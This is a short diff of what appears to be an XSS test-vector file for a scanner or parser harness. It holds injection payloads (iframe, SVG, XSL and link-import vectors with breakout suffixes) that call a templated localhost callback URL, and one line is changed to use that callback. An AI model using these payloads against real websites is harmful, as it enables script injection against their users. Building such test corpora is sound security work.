@@ -65,4 +65,4 @@
 <div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src='http://127.0.0.1:8000/xss/{}/{}'></iframe>//["'`-->]]>]</div>
 <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl='http://127.0.0.1:8000/xss/{}/{}'>      
 <div id="128"><svg><style>&lt;img/src='http://127.0.0.1:8000/xss/{}/{}'// </b>//["'`-->]]>]</div>
-<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x &gt;" />//["'`-->]]>]</div>undefined
+<div id="138"><link rel="import" href='http://127.0.0.1:8000/xss/{}/{}' />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x &gt;" />//["'`-->]]>]</div>undefined
